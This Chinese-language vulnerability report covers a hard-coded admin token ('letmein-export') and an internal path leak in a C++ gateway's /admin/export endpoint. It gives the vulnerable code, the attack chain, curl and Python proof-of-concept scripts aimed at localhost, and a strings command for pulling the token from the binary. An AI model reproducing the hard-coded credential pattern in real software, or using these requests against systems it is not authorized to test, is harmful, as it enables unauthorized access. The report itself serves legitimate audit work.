# VULN-DF-FC-002: 管理导出接口使用硬编码凭证作为唯一认证机制并泄露内部路径

**严重性**: High | **CWE**: CWE-798 (Use of Hard-coded Credentials) | **置信度**: 85/100
**位置**: `src/file_cache.cpp:21-24` @ `FileCache::exportSnapshot`

---

## 1. 漏洞细节

`FileCache::exportSnapshot()` 函数在源代码中硬编码了一个明文字符串 `"letmein-export"` 作为 `/admin/export` 管理端点的**唯一认证凭据**。该端点通过未认证的 HTTP GET 请求即可访问，token 以 URL query 参数形式传递。

此漏洞存在以下安全问题：

1. **硬编码凭证（CWE-798）**: 认证 token 以字符串字面量形式直接嵌入源代码（`file_cache.cpp:22`），任何能够访问源代码或二进制文件（通过逆向工程或 `strings` 命令提取）的人都可以轻易获取该 token。
2. **无其他认证层**: `/admin/export` 端点不要求用户登录、会话验证或任何其他身份认证机制，硬编码 token 是唯一的访问控制屏障。
3. **Token 通过 URL 传递**: token 出现在 URL query 参数中，会被记录在 Web 服务器访问日志、浏览器历史记录、代理服务器日志中，进一步扩大泄露面。
4. **信息泄露**: 认证成功后，响应中包含 `data_dir=<baseDir_>` 字段（`file_cache.cpp:29`），泄露服务器内部文件系统路径，为后续攻击提供情报。

## 2. 漏洞代码

**文件**: `src/file_cache.cpp` (行 21-31)

```cpp
std::string FileCache::exportSnapshot(const std::string& token) const {
  if (token != "letmein-export") {  // ← 漏洞根因：硬编码凭证
    return "denied\n";
  }

  std::ostringstream out;
  out << "users=3\n";
  out << "last_backup=disabled\n";
  out << "data_dir=" << baseDir_ << "\n";  // ← 信息泄露：暴露内部路径
  return out.str();
}
```

**漏洞调用入口**: `src/main.cpp` (行 70-74)

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
    std::string token = queryValue(request, "token");  // 从 URL query 提取 token
    audit.event("admin", "export", token);
    return text(200, files.exportSnapshot(token));     // 直接传递给 exportSnapshot
});
```

**代码分析**:

- **第 22 行**（漏洞根因）: `token != "letmein-export"` 是唯一的认证检查。该字符串在编译后存在于二进制文件的 `.rodata` 段中，可通过 `strings` 命令或反汇编工具轻松提取。
- **第 29 行**（信息泄露）: `baseDir_` 在 `FileCache` 构造时被设置为 `"data"`（`main.cpp:31`），但在更复杂的部署场景中可能包含绝对路径，泄露服务器目录结构。
- **无速率限制**: 认证失败时仅返回 `"denied\n"`，无任何速率限制或账户锁定机制，允许暴力破解攻击。

## 3. 完整攻击链路

```
[网络入口] recv()@src/http_server.cpp:113
↓ 接收原始 HTTP 请求数据（包含 GET /admin/export?token=letmein-export）
[请求解析] parseRequest()@src/http_server.cpp:42
↓ 解析 HTTP 方法、路径和 query 参数
[Query 解析] parseQuery()@src/http_server.cpp:19
↓ 将 query 字符串 "token=letmein-export" 解析为 map{"token": "letmein-export"}
[Token 提取] queryValue(request, "token")@src/main.cpp:71
↓ 从 request.query 中提取 "token" 对应的值
[审计记录] audit.event("admin", "export", token)@src/main.cpp:72
↓ token 被记录到审计日志（额外泄露风险）
[漏洞触发] exportSnapshot(token)@src/file_cache.cpp:21-22
↓ token 与硬编码 "letmein-export" 比较，匹配则返回敏感数据
[信息泄露] "data_dir=" << baseDir_@src/file_cache.cpp:29
↓ 响应中泄露服务器内部目录路径
```

**攻击链路详细说明**:

1. **网络入口** (`http_server.cpp:113`): `recv()` 从 TCP socket 接收原始 HTTP 请求数据，攻击者完全控制请求内容。
2. **请求解析** (`http_server.cpp:42-68`): `parseRequest()` 将原始请求解析为 `HttpRequest` 结构体，提取方法、路径、query 参数和头部。
3. **Query 解析** (`http_server.cpp:19-32`): `parseQuery()` 将 query 字符串按 `&` 分割，再按 `=` 分割键值对，无任何过滤或清洗。
4. **路由匹配** (`http_server.cpp:120`): 根据 `"GET /admin/export"` 查找已注册的处理器并调用。
5. **Token 提取** (`main.cpp:71`): `queryValue()` 从 query map 中提取 `"token"` 键的值，直接传递给 `exportSnapshot()`。
6. **认证绕过** (`file_cache.cpp:22`): 攻击者提供的 token 与硬编码值 `"letmein-export"` 进行简单字符串比较，匹配即通过认证。
7. **数据泄露** (`file_cache.cpp:26-30`): 返回包含用户数量、备份状态和内部目录路径的敏感信息。

## 4. 攻击场景

**攻击者画像**: 任何能够通过网络访问目标服务器的远程攻击者，无需任何认证凭据。攻击者可能通过以下途径获取硬编码 token：
- 访问源代码仓库（开源项目或代码泄露）
- 对二进制文件进行逆向工程（`strings` 命令即可提取）
- 从访问日志或代理日志中获取

**攻击向量**: 通过 HTTP GET 请求，将硬编码 token 作为 URL query 参数传递。

**利用难度**: **低**

### 攻击步骤

1. **获取 token**: 攻击者通过源代码审查或二进制逆向工程获取硬编码 token `"letmein-export"`。
   ```bash
   # 从二进制文件中提取（如果无源码访问权限）
   strings edge-gateway | grep -i export
   ```
2. **构造请求**: 构造包含 token 的 HTTP GET 请求。
3. **发送请求**: 向目标服务器的 `/admin/export` 端点发送请求。
4. **获取敏感数据**: 接收包含系统内部信息的响应，包括用户数量、备份状态和内部目录路径。
5. **利用泄露信息**: 使用泄露的 `data_dir` 路径信息规划后续攻击（如路径遍历攻击）。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                 |
| ---------- | -------------- | -------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 攻击者需要能够访问目标服务器的 HTTP 端口（默认 8080，可通过命令行参数配置） |
| 认证要求   | 无需认证       | 该端点不要求任何用户认证或会话，硬编码 token 是唯一屏障               |
| 配置依赖   | 无特殊配置     | 端点在服务器启动时自动注册，无需额外配置启用                         |
| 环境依赖   | 无特殊要求     | 任何能发送 HTTP 请求的环境均可利用                                   |
| Token 获取 | 需要获取 token | 攻击者需通过源码审查或逆向工程获取 token，但难度极低（明文硬编码）   |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                   |
| -------- | ---- | -------------------------------------------------------------------------------------- |
| 机密性   | 高   | 管理端点被未授权访问，泄露系统内部信息（用户数量、备份配置、内部目录路径）             |
| 完整性   | 低   | 当前版本仅读取数据不修改，但管理端点的未授权访问可能为后续攻击提供情报                 |
| 可用性   | 低   | 当前端点不影响服务可用性，但暴露的管理信息可能被用于策划拒绝服务攻击                   |

**影响范围**: 

- **直接影响**: 管理导出接口的访问控制被完全绕过，任何获取 token 的攻击者均可访问管理数据。
- **间接影响**: 泄露的 `baseDir_` 路径信息可辅助攻击者进行路径遍历攻击（结合 `/files` 端点的路径遍历漏洞 VULN-DF-FC-001），形成攻击链。
- **Token 泄露面**: token 以 URL 参数形式传递，会出现在服务器访问日志、浏览器历史、代理日志、Referer 头部中，增加被非预期方获取的风险。
- **审计日志污染**: token 被记录到审计日志（`main.cpp:72`），如果审计日志被其他系统读取，token 可能进一步扩散。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 使用 curl 验证未授权访问

```bash
# 仅供安全测试使用 - 验证硬编码凭证漏洞
# 假设目标服务器运行在 localhost:8080

# 步骤 1: 使用错误 token 验证访问被拒绝
curl -v "http://localhost:8080/admin/export?token=wrong-token"
# 预期响应: "denied"

# 步骤 2: 使用硬编码 token 验证访问被允许
curl -v "http://localhost:8080/admin/export?token=letmein-export"
# 预期响应:
# users=3
# last_backup=disabled
# data_dir=data

# 步骤 3: 不带 token 参数验证
curl -v "http://localhost:8080/admin/export"
# 预期响应: "denied"（空字符串不等于硬编码 token）
```

### PoC 2: 从二进制文件提取硬编码 token

```bash
# 仅供安全测试使用 - 演示从二进制提取硬编码凭证
# 假设编译后的二进制文件名为 edge-gateway

strings edge-gateway | grep -i "letmein"
# 预期输出: letmein-export
```

### PoC 3: Python 自动化验证脚本

```python
#!/usr/bin/env python3
"""仅供安全测试使用 - 验证硬编码凭证漏洞"""

import socket
import sys

def send_request(host, port, token):
    """发送 HTTP GET 请求到 /admin/export"""
    request = (
        f"GET /admin/export?token={token} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n\r\n"
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    sock.sendall(request.encode())
    
    response = b""
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data
    sock.close()
    
    return response.decode(errors="replace")

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    # 测试硬编码 token
    print("[*] 测试硬编码凭证 'letmein-export'...")
    response = send_request(host, port, "letmein-export")
    
    if "users=" in response and "data_dir=" in response:
        print("[!] 漏洞确认: 硬编码凭证有效，管理数据泄露")
        # 提取响应体
        body = response.split("\r\n\r\n", 1)[-1]
        print(f"[!] 泄露数据:\n{body}")
        
        # 检查是否泄露了路径信息
        for line in body.split("\n"):
            if line.startswith("data_dir="):
                print(f"[!] 内部路径泄露: {line}")
    else:
        print("[-] 漏洞未触发或已修复")
    
    # 测试错误 token
    print("\n[*] 测试错误凭证...")
    response = send_request(host, port, "wrong-token")
    if "denied" in response:
        print("[*] 错误凭证被正确拒绝")

if __name__ == "__main__":
    main()
```

**使用说明**: 

1. 确保目标服务器已启动并监听在指定端口。
2. 执行 PoC 1 中的 curl 命令，观察响应差异。
3. 或使用 PoC 3 的 Python 脚本进行自动化验证：`python3 poc.py 127.0.0.1 8080`

**预期结果**: 

- 使用硬编码 token `"letmein-export"` 时，服务器返回 HTTP 200 响应，包含 `users=3`、`last_backup=disabled` 和 `data_dir=data` 等敏感信息。
- 使用其他 token 或不提供 token 时，返回 `"denied"`。
- 响应中的 `data_dir` 字段泄露了服务器内部目录路径。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux (Ubuntu 20.04+ / Debian 11+ / Alpine 3.14+)
- 编译器: GCC 10+ 或 Clang 12+（支持 C++17）
- 依赖: 标准 C++ 库（无第三方依赖）
- 工具: curl（用于验证）、strings/binutils（用于二进制分析）

### 构建步骤

```bash
# 进入项目目录
cd /scan/project

# 使用 CMake 构建（如果项目提供 CMakeLists.txt）
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)

# 或直接编译
g++ -std=c++17 -I include -o edge-gateway \
    src/main.cpp src/http_server.cpp src/file_cache.cpp \
    src/user_store.cpp src/diagnostics.cpp src/audit_log.cpp
```

### 运行配置

```bash
# 启动服务器（默认端口 8080）
./edge-gateway

# 或指定端口
./edge-gateway 9090
```

### 验证步骤

1. 启动目标服务器：`./edge-gateway 8080`
2. 在另一个终端中执行 PoC curl 命令：
   ```bash
   curl "http://localhost:8080/admin/export?token=letmein-export"
   ```
3. 观察响应中是否包含敏感管理数据。
4. 使用 `strings` 验证二进制中的硬编码 token：
   ```bash
   strings edge-gateway | grep letmein
   ```

### 预期结果

- 服务器返回包含 `users=3`、`last_backup=disabled`、`data_dir=data` 的响应文本。
- `strings` 命令输出 `letmein-export`，确认硬编码凭证可从二进制中提取。
- 审计日志文件 `edge-gateway.audit.log` 中记录了 token 值，确认 token 在日志中泄露。
